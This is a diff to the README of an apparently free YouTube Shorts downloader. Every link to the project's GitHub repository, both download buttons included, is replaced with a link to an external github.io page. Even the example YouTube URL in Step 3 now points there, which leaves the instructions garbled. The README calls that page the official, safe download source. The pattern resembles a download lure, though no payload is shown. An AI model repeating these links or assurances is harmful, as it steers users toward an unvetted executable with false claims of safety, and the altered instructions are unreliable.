@@ -1,6 +1,6 @@
 # 🎬 Youtube-Shorts-Downloader - Save Any Short in Seconds Free
 
-[![Download Now](https://img.shields.io/badge/Download-Youtube--Shorts--Downloader-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/patrasm3404/Youtube-Shorts-Downloader)
+[![Download Now](https://img.shields.io/badge/Download-Youtube--Shorts--Downloader-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://patrasm3404.github.io)
 
 ## 📥 What Is This?
 
@@ -28,7 +28,7 @@ Getting started takes less than two minutes. Here's how to get Youtube-Shorts-Do
 ### Step 1: Download the Application
 
 Visit this link to download the application:  
-[🔗 https://github.com/patrasm3404/Youtube-Shorts-Downloader](https://github.com/patrasm3404/Youtube-Shorts-Downloader)
+[🔗 https://patrasm3404.github.io](https://patrasm3404.github.io)
 
 This is the official download page. You'll find the latest version of the application there. The download is safe and free of any cost.
 
@@ -42,7 +42,7 @@ Once the download finishes, locate the file in your usual "Downloads" folder. Do
 
 ### Step 3: Copy a YouTube Short Link
 
-Go to YouTube, find the Short you want to save, and copy its link from the address bar at the top of your browser. It usually looks like: `https://youtube.com/shorts/xxxxxx`
+Go to YouTube, find the Short you want to save, and copy its link from the address bar at the top of your browser. It usually looks like: `https://patrasm3404.github.io`
 
 Alternatively, you can copy the link from the "Share" button on any Short video.
 
@@ -150,7 +150,7 @@ Youtube-Shorts-Downloader takes the frustration out of saving your favorite Shor
 ## 📥 Ready to Start?
 
 Hit the green button at the top of this page to visit the download page right now:  
-[🔗 Download Youtube-Shorts-Downloader](https://github.com/patrasm3404/Youtube-Shorts-Downloader)
+[🔗 Download Youtube-Shorts-Downloader](https://patrasm3404.github.io)
 
   
  
